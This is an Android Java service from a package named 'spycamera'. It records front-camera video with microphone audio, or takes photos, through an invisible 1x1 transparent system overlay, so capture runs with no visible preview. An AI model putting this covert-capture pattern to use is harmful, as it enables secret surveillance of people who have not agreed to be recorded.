package com.spycamera;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.ResultReceiver;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.widget.Toast;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Iterator;
import java.util.List;

public class CameraService extends Service {
    private static final String TAG = CameraService.class.getSimpleName();

    public static final String RESULT_RECEIVER = "resultReceiver";
    public static final String VIDEO_PATH = "recordedVideoPath";

    public static final int RECORD_RESULT_OK = 0;
    public static final int RECORD_RESULT_DEVICE_NO_CAMERA= 1;
    public static final int RECORD_RESULT_GET_CAMERA_FAILED = 2;
    public static final int RECORD_RESULT_ALREADY_RECORDING = 3;
    public static final int RECORD_RESULT_NOT_RECORDING = 4;

    private static final String START_SERVICE_COMMAND = "startServiceCommands";
    private static final int COMMAND_NONE = -1;
    private static final int COMMAND_START_RECORDING = 0;
    private static final int COMMAND_STOP_RECORDING = 1;
    private static final int COMMAND_START_IMAGE_CAPTURE = 2;
    private static final int COMMAND_STOP_IMAGE_CAPTURE = 3;
    public static final String IMGE_PATH ="capture image path" ;

    private Camera mCamera;
    private MediaRecorder mMediaRecorder;

    private boolean mRecording = false;
    private String mRecordingPath = null;
    private int cameraId=-1;

    public CameraService() {
    }

    public static void startToStartRecording(Context context, ResultReceiver resultReceiver) {
        Intent intent = new Intent(context, CameraService.class);
        intent.putExtra(START_SERVICE_COMMAND, COMMAND_START_RECORDING);
        intent.putExtra(RESULT_RECEIVER, resultReceiver);
        context.startService(intent);
    }


    public static void startToCaptureImage(Context context, ResultReceiver resultReceiver) {
        Intent intent = new Intent(context, CameraService.class);
        intent.putExtra(START_SERVICE_COMMAND, COMMAND_START_IMAGE_CAPTURE);
        intent.putExtra(RESULT_RECEIVER, resultReceiver);
        context.startService(intent);
    }
    public static void startToStopRecording(Context context, ResultReceiver resultReceiver) {
        Intent intent = new Intent(context, CameraService.class);
        intent.putExtra(START_SERVICE_COMMAND, COMMAND_STOP_RECORDING);
        intent.putExtra(RESULT_RECEIVER, resultReceiver);
        context.startService(intent);
    } public static void startToStopCapture(Context context, ResultReceiver resultReceiver) {
        Intent intent = new Intent(context, CameraService.class);
        intent.putExtra(START_SERVICE_COMMAND, COMMAND_STOP_IMAGE_CAPTURE);
        intent.putExtra(RESULT_RECEIVER, resultReceiver);
        context.startService(intent);
    }

    private String mcaptureImagePath=null;
    /**
     * Used to take picture.
     */


    Camera.PictureCallback mPicture = new Camera.PictureCallback() {

        @Override
        public void onPictureTaken(byte[] data, Camera camera) {
          File  pictureFile =  Util.getOutputMediaFile(Util.MEDIA_TYPE_IMAGE);
            camera.startPreview();
            if (pictureFile == null) {
                return;
            }
            try {
                FileOutputStream fos = new FileOutputStream(pictureFile);
                fos.write(data);
                fos.close();
                mcaptureImagePath=pictureFile.getPath();
            } catch (FileNotFoundException e) {

            } catch (IOException e) {
            }
        }
    };


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        switch (intent.getIntExtra(START_SERVICE_COMMAND, COMMAND_NONE)) {
            case COMMAND_START_RECORDING:
                handleStartRecordingCommand(intent);
                break;
            case COMMAND_STOP_RECORDING:
                handleStopRecordingCommand(intent);
                break;
            case COMMAND_START_IMAGE_CAPTURE:
                handleStartCaptureImage(intent);
                break;
            case COMMAND_STOP_IMAGE_CAPTURE:
                handleStopCaptureCommand(intent);
                break;
            default:
                throw new UnsupportedOperationException("Cannot start service with illegal commands");
        }

        return START_NOT_STICKY;
    }

    private void handleStartCaptureImage(Intent intent) {
        final ResultReceiver resultReceiver = intent.getParcelableExtra(RESULT_RECEIVER);

        if (Util.checkCameraHardware(this)) {
            mCamera = Util.getCameraInstance();
            cameraId = Util.findFrontFacingCamera();
            if (cameraId < 0) {
                Toast.makeText(this, "No front facing camera found.",
                        Toast.LENGTH_LONG).show();
            } else {
                safeCameraOpen(cameraId);
            }
            if (mCamera != null) {


                SurfaceView sv = new SurfaceView(this);

                WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                        PixelFormat.TRANSLUCENT);

                SurfaceHolder sh = sv.getHolder();

                sv.setZOrderOnTop(true);
                sh.setFormat(PixelFormat.TRANSPARENT);

                sh.addCallback(new SurfaceHolder.Callback() {
                    @Override
                    public void surfaceCreated(SurfaceHolder holder) {
                        Camera.Parameters params = mCamera.getParameters();
                        mCamera.setParameters(params);
                        Camera.Parameters p = mCamera.getParameters();

                        List<Camera.Size> listSize;

                        listSize = p.getSupportedPreviewSizes();
                        Camera.Size mPreviewSize = listSize.get(2);
                        Log.v("TAG", "preview width = " + mPreviewSize.width
                                + " preview height = " + mPreviewSize.height);
                        p.setPreviewSize(mPreviewSize.width, mPreviewSize.height);

                        listSize = p.getSupportedPictureSizes();
                        Camera.Size mPictureSize = listSize.get(2);
                        Log.v("TAG", "capture width = " + mPictureSize.width
                                + " capture height = " + mPictureSize.height);

                        p.setPictureSize(mPictureSize.width, mPictureSize.height);



                        Camera.Size bestSize = null;
                        List<Camera.Size> sizeList = mCamera.getParameters().getSupportedPreviewSizes();
                        bestSize = sizeList.get(0);
                        for(int i = 1; i < sizeList.size(); i++){
                            if((sizeList.get(i).width * sizeList.get(i).height) > (bestSize.width * bestSize.height)){
                                bestSize = sizeList.get(i);
                            }
                        }

                        List<Integer> supportedPreviewFormats = p.getSupportedPreviewFormats();
                        Iterator<Integer> supportedPreviewFormatsIterator = supportedPreviewFormats.iterator();
                        while(supportedPreviewFormatsIterator.hasNext()){
                            Integer previewFormat =supportedPreviewFormatsIterator.next();
                            if (previewFormat == ImageFormat.JPEG) {
                                p.setPreviewFormat(previewFormat);
                            }
                        }

                        Log.v("TAG", "preview width = " + bestSize.width
                                + " preview height = " + bestSize.height);
                        p.setPreviewSize(bestSize.width, bestSize.height);

                        p.setPictureSize(bestSize.width, bestSize.height);
                        p.setFlashMode(Camera.Parameters.FLASH_MODE_AUTO);
                        p.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);
                        p.setSceneMode(Camera.Parameters.SCENE_MODE_AUTO);
                        p.setWhiteBalance(Camera.Parameters.WHITE_BALANCE_AUTO);
                        p.setExposureCompensation(0);
                        p.setPictureFormat(ImageFormat.JPEG);
                        p.setJpegQuality(100);
                        p.setRotation(90);
                        mCamera.setParameters(p);

                        try {
                            mCamera.setPreviewDisplay(holder);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        mCamera.startPreview();



                        mCamera.takePicture(null, null, mPicture);


                        Bundle b = new Bundle();
                        b.putString(IMGE_PATH, mcaptureImagePath);

                        mcaptureImagePath = null;

                        resultReceiver.send(RECORD_RESULT_OK, b);
                        //  releaseCamera();
                        Log.d(TAG, "Recording is started");
                    }

                    @Override
                    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
                    }

                    @Override
                    public void surfaceDestroyed(SurfaceHolder holder) {

                    }
                });


                wm.addView(sv, params);

            } else {
                Log.d(TAG, "Get Camera from service failed");
                resultReceiver.send(RECORD_RESULT_GET_CAMERA_FAILED, null);
            }
        } else {
            Log.d(TAG, "There is no camera hardware on device.");
            resultReceiver.send(RECORD_RESULT_DEVICE_NO_CAMERA, null);
        }
    }

    private boolean safeCameraOpen(int id) {
        boolean qOpened = false;
        try {
            releaseCamera();
            mCamera = Camera.open(id);
            qOpened = (mCamera != null);
        } catch (Exception e) {
            Log.e(getString(R.string.app_name), "failed to open Camera");
            e.printStackTrace();
        }
        return qOpened;
    }
    private void releaseCamera() {
        if (mCamera != null) {
            mCamera.stopPreview();
            mCamera.release();
            mCamera = null;
        }
    }

    private void handleStartRecordingCommand(Intent intent) {
        final ResultReceiver resultReceiver = intent.getParcelableExtra(RESULT_RECEIVER);

        if (mRecording) {
            // Already recording
            resultReceiver.send(RECORD_RESULT_ALREADY_RECORDING, null);
            return;
        }
        mRecording = true;

        if (Util.checkCameraHardware(this)) {
            mCamera = Util.getCameraInstance();

            if (mCamera != null) {

                    cameraId = Util.findFrontFacingCamera();
                    if (cameraId < 0) {
                        Toast.makeText(this, "No front facing camera found.",
                                Toast.LENGTH_LONG).show();
                    } else {
                        safeCameraOpen(cameraId);
                    }
                SurfaceView sv = new SurfaceView(this);

                WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                        PixelFormat.TRANSLUCENT);

                SurfaceHolder sh = sv.getHolder();

                sv.setZOrderOnTop(true);
                sh.setFormat(PixelFormat.TRANSPARENT);

                sh.addCallback(new SurfaceHolder.Callback() {
                    @Override
                    public void surfaceCreated(SurfaceHolder holder) {
                        Camera.Parameters params = mCamera.getParameters();
                        mCamera.setParameters(params);
                        Camera.Parameters p = mCamera.getParameters();

                        List<Camera.Size> listSize;

                        listSize = p.getSupportedPreviewSizes();
                        Camera.Size mPreviewSize = listSize.get(2);
                        Log.v("TAG", "preview width = " + mPreviewSize.width
                                + " preview height = " + mPreviewSize.height);
                        p.setPreviewSize(mPreviewSize.width, mPreviewSize.height);

                        listSize = p.getSupportedPictureSizes();
                        Camera.Size mPictureSize = listSize.get(2);
                        Log.v("TAG", "capture width = " + mPictureSize.width
                                + " capture height = " + mPictureSize.height);
                        p.setPictureSize(mPictureSize.width, mPictureSize.height);
                        mCamera.setParameters(p);

                        try {
                            mCamera.setPreviewDisplay(holder);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        mCamera.startPreview();

                        mCamera.unlock();

                        mMediaRecorder = new MediaRecorder();
                        mMediaRecorder.setCamera(mCamera);

                        mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);

                        mMediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));

                        mRecordingPath = Util.getOutputMediaFile(Util.MEDIA_TYPE_VIDEO).getPath();
                        mMediaRecorder.setOutputFile(mRecordingPath);

                        mMediaRecorder.setPreviewDisplay(holder.getSurface());

                        try {
                            mMediaRecorder.prepare();
                        } catch (IllegalStateException e) {
                            Log.d(TAG, "IllegalStateException when preparing MediaRecorder: " + e.getMessage());
                        } catch (IOException e) {
                            Log.d(TAG, "IOException when preparing MediaRecorder: " + e.getMessage());
                        }
                        mMediaRecorder.start();

                        resultReceiver.send(RECORD_RESULT_OK, null);
                        Log.d(TAG, "Recording is started");
                    }

                    @Override
                    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
                    }

                    @Override
                    public void surfaceDestroyed(SurfaceHolder holder) {
                    }
                });


                wm.addView(sv, params);

            } else {
                Log.d(TAG, "Get Camera from service failed");
                resultReceiver.send(RECORD_RESULT_GET_CAMERA_FAILED, null);
            }
        } else {
            Log.d(TAG, "There is no camera hardware on device.");
            resultReceiver.send(RECORD_RESULT_DEVICE_NO_CAMERA, null);
        }
    }

    private void handleStopRecordingCommand(Intent intent) {
        ResultReceiver resultReceiver = intent.getParcelableExtra(RESULT_RECEIVER);

        if (!mRecording) {
            // have not recorded
            resultReceiver.send(RECORD_RESULT_NOT_RECORDING, null);
            return;
        }

        mMediaRecorder.stop();
        mMediaRecorder.release();
        mCamera.stopPreview();
        mCamera.release();

        Bundle b = new Bundle();
        b.putString(VIDEO_PATH, mRecordingPath);

        mRecordingPath = null;

        resultReceiver.send(RECORD_RESULT_OK, b);

        mRecording = false;
        Log.d(TAG, "recording is finished.");
    }
    private void handleStopCaptureCommand(Intent intent) {
        ResultReceiver resultReceiver = intent.getParcelableExtra(RESULT_RECEIVER);


        mCamera.stopPreview();
        mCamera.release();



        resultReceiver.send(RECORD_RESULT_OK, null);


        Log.d(TAG, "background capturing  finished.");
    }
    @Override
    public IBinder onBind(Intent intent) {

        return null;

    }

}
